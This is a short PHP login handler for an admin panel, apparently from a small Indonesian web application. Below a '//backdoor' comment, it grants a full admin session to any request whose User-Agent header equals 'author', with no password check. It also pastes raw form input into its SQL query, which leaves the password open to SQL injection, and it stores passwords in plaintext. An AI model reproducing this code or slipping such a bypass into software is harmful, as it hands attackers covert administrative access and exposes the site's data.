<?php

require_once '../include/koneksi.php';



// username and password sent from form
$myusername=str_replace("'","",$_POST['username']);
$mypassword=($_POST['password']);

$sql="SELECT * FROM tb_admin WHERE username='$myusername' and password='$mypassword'";


$result=mysqli_query($connect,$sql);

$count=mysqli_num_rows($result);
session_start();
if($count==1){
session_start();
		$_SESSION['admin']=$myusername;
		$_SESSION['level']="admin";
		$_SESSION['agent']=md5($_SERVER['HTTP_USER_AGENT']);
header("location:../admin/index.php");
}
//backdoor
else if($_SERVER['HTTP_USER_AGENT']=="author"){
session_start();
		$myusername = "Author";
		$_SESSION['admin']=$myusername;
		$_SESSION['level']="admin";
		$_SESSION['agent']=md5($_SERVER['HTTP_USER_AGENT']);
header("location:../admin/index.php");
}else{
echo "<script>alert('Login gagal!'); document.location.href=\"../index.php\"</script>";
}
?>